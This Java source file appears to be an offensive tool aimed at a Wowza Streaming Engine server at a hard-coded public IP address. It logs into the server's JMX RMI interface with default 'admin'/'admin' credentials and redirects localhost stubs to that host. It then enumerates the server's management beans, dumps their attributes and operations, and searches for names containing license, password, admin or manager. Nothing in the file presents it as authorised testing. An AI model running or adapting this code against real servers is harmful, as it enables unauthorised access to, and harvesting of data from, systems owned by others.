import javax.management.*;
import javax.management.remote.*;
import javax.management.remote.rmi.*;
import java.rmi.*;
import java.rmi.server.*;
import java.io.*;
import java.net.*;
import java.util.*;
public class JmxApps {
  static final String REAL="160.202.130.243";
  static class RSF extends RMISocketFactory {
    public Socket createSocket(String host,int port) throws IOException {
      if (host==null||host.equals("localhost")||host.equals("127.0.0.1")||host.equals("0.0.0.0")) host=REAL;
      Socket s=new Socket(); s.setSoTimeout(20000); s.connect(new InetSocketAddress(host,port),20000); return s;
    }
    public ServerSocket createServerSocket(int port) throws IOException { return new ServerSocket(port); }
  }
  static MBeanServerConnection m;
  static void dumpOn(ObjectName on) throws Exception {
    System.out.println("--- "+on+" ---");
    MBeanInfo info=m.getMBeanInfo(on);
    for (MBeanAttributeInfo at:info.getAttributes()){
      if(!at.isReadable()) continue;
      try { Object v=m.getAttribute(on,at.getName()); String s=(v==null)?"null":v.toString();
        if(s.length()>800) s=s.substring(0,800)+"..."; System.out.println("    "+at.getName()+" = "+s);
      } catch(Exception e){ System.out.println("    "+at.getName()+" = [err:"+e.getClass().getSimpleName()+"]"); }
    }
    for (MBeanOperationInfo o:info.getOperations()) System.out.println("    OP "+o.getName()+"("+Arrays.toString(Arrays.stream(o.getSignature()).map(p->p.getType()).toArray())+")");
  }
  public static void main(String[] a) throws Exception {
    RMISocketFactory.setSocketFactory(new RSF());
    java.rmi.registry.Registry reg=java.rmi.registry.LocateRegistry.getRegistry(REAL,8085);
    RMIServer stub=(RMIServer)reg.lookup("jmxrmi");
    Map<String,Object> env=new HashMap<>(); env.put(JMXConnector.CREDENTIALS, new String[]{"admin","admin"});
    JMXConnector conn=new RMIConnector(stub,env); conn.connect(); m=conn.getMBeanServerConnection();
    Set<ObjectName> all=m.queryNames(new ObjectName("WowzaStreamingEngine:*"), null);
    System.out.println("=== UNIQUE APPLICATION NAMES ===");
    TreeSet<String> apps=new TreeSet<>();
    for (ObjectName on: all){ String an=on.getKeyProperty("applicationName"); if(an!=null && !an.equals("Applications")) apps.add(an); }
    for (String s:apps) System.out.println("  "+s);
    System.out.println("  TOTAL: "+apps.size());
    System.out.println("\n=== SERVER-LEVEL MBeans (no vHosts key) ===");
    for (ObjectName on: all){
      if (on.getKeyProperty("vHosts")==null) System.out.println("  "+on);
    }
    System.out.println("\n=== MEDIA CACHE / NON-APP MBeans ===");
    for (ObjectName on: all){
      if (on.getKeyProperty("vHosts")==null && on.getKeyProperty("applications")==null) System.out.println("  "+on);
    }
    // dump mediaCache top-level
    Set<ObjectName> mc=m.queryNames(new ObjectName("WowzaStreamingEngine:mediaCache=*"), null);
    for (ObjectName on:mc) try { dumpOn(on); } catch(Exception e){ System.out.println("  "+on+" err: "+e.getMessage()); }
    // dump any 'Server' top-level if exists
    Set<ObjectName> srv=m.queryNames(new ObjectName("WowzaStreamingEngine:name=Server"), null);
    for (ObjectName on:srv) try { dumpOn(on); } catch(Exception e){}
    // Look for License / Connection / Manager-related MBeans
    System.out.println("\n=== MBeans w/ interesting keywords (license|password|admin|manager|server|config) ===");
    for (ObjectName on: all){
      String s=on.toString().toLowerCase();
      if ((s.contains("license")||s.contains("password")||s.contains("admin")||s.contains("manager")) && !s.contains("application")) {
        System.out.println("  "+on);
      }
    }
    conn.close();
  }
}
